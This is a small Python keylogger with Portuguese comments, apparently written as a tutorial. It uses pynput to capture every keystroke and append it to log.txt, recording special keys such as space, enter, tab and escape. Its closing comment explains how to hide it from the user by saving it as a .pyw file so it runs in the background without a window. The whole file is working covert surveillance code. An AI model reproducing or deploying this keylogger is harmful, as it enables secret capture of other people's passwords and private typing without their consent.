# importando a biblioteca
from pynput import keyboard

#criando uma lista de teclas a serem ignoradas ao seresm clicadas
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_r,
    keyboard.Key.alt_l,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}
# criando a função principal on_press ela é chamada toda vez que uma tecla é pressionada
def on_press(key):
    
    # criamos um try para capturar a tecla toda vez que ela for acionada
    # se for uma tecla normal(letra, número, símbolo)
    try:
        with open("log.txt", "a" , encoding="utf-8") as f:
            f.write(key.char)
    
    # dentro do except estamos trantando das tecla especiais(enter, scap, tab, space)
    # serão capturadas como outros simbolos
    except AttributeError:
         with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key ==  keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f" [{key}] ")   #se as teclas que forem acionadas 
                                        #forem as ignoradas não serão marcadas

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# para tornar o keylogger invisivel para o usuario e operar em silêncio
# é só mudar a extensão do keylogger.py para pyw é uma extensão do python para o win
# não abre nehuma janela ficara rodando em segundo plano.
# keylogger       